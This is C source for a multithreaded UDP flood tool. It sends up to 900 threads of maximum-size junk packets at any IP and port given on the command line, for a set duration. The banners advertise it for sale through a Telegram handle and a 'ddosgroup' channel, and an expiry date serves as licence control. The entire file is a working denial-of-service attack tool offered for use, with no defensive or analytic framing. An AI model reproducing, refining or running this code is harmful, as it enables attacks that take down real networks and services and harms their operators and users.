#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <sys/socket.h>
#include <sched.h>
#include <sys/resource.h>
#include <zlib.h>
#include <net/if.h>
#include <libgen.h>

#define PACKET_SIZE 65507 // Maximum UDP packet size
#define MAX_THREADS 900 // Increased maximum threads for extreme performance
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 4
#define EXPIRATION_DAY 10

char *server_ip;
int server_port;
int duration;
int thread_count;

void check_expiration() {
    time_t now;
    struct tm expiration_date = {0};   
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;  
    time(&now);
    if (difftime(mktime(&expiration_date), now) <= 0) {
        fprintf(stderr, "\033[1;31m🔥 ===========================\n");
        fprintf(stderr, "🔥 FILE CLOSED BY @SLAYER_OP7 🔥\n");
        fprintf(stderr, "🚀 DM TO BUY NEW FILE @SLAYER_OP7 🚀\n");
        fprintf(stderr, "🔥 ===========================\n\033[0m");
        exit(EXIT_FAILURE);
    }
}

void check_binary_name(char *binary_name) {
    if (strcmp(basename(binary_name), "ISAGI") != 0) {
        fprintf(stderr, "\033[1;31m\n🔥 ERROR: BINARY NAME MUST BE 'ISAGI' 🔥\n\033[0m");
        exit(EXIT_FAILURE);
    }
}

void *send_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[PACKET_SIZE];
    memset(buffer, 'X', PACKET_SIZE);
    
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(sched_getcpu() % 64, &cpuset); // Optimized for high-core CPUs
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address");
        close(sock);
        pthread_exit(NULL);
    }
    
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        if (sendto(sock, buffer, PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            break;
        }
    }
    
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    check_expiration();
    check_binary_name(argv[0]);

    if (argc != 5) {
        fprintf(stderr, "\033[1;31m🔥 ===========================\n");
        fprintf(stderr, "🚀 USAGE: %s <IP> <PORT> <DURATION> <THREADS> 🚀\n", argv[0]);
        fprintf(stderr, "🔥 ===========================\n");
        fprintf(stderr, "⚡ AFTER EXPIRE DM @SLAYER_OP7 ⚡\n");
        fprintf(stderr, "🔥 ===========================\n");
        fprintf(stderr, "🔥 THIS EXPIRES ON %d-%02d-%02d 🔥\n", EXPIRATION_YEAR, EXPIRATION_MONTH, EXPIRATION_DAY);
        fprintf(stderr, "🔥 ===========================\n");
        fprintf(stderr, "🚀 OWNER: @SLAYER_OP7 🚀\n");
        fprintf(stderr, "🔥 ===========================\n");
        fprintf(stderr, "🔥 JOIN CHANNEL @ddosgroupbyzodvik 🔥\n");
        fprintf(stderr, "🔥 ===========================\n\033[0m");
        exit(EXIT_FAILURE);
    }
    
    server_ip = argv[1];
    server_port = atoi(argv[2]);
    duration = atoi(argv[3]);
    thread_count = atoi(argv[4]);
    
    if (thread_count > MAX_THREADS) {
        fprintf(stderr, "\033[1;31mThread count exceeds maximum allowed (%d).\033[0m\n", MAX_THREADS);
        exit(EXIT_FAILURE);
    }
    
    struct rlimit limit;
    limit.rlim_cur = limit.rlim_max = 1048576; // Increase file descriptor limit
    setrlimit(RLIMIT_NOFILE, &limit);
    
    pthread_t *threads = malloc(sizeof(pthread_t) * thread_count);
    if (!threads) {
        perror("Memory allocation failed");
        exit(EXIT_FAILURE);
    }
    
    for (int i = 0; i < thread_count; i++) {
        if (pthread_create(&threads[i], NULL, send_traffic, NULL) != 0) {
            perror("Thread creation failed");
            free(threads);
            return EXIT_FAILURE;
        }
    }
    
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    free(threads);
    printf("\033[1;32m🔥 ALMIGHTY TRAFFIC GENERATION COMPLETED 🔥\033[0m\n");
    return EXIT_SUCCESS;
}
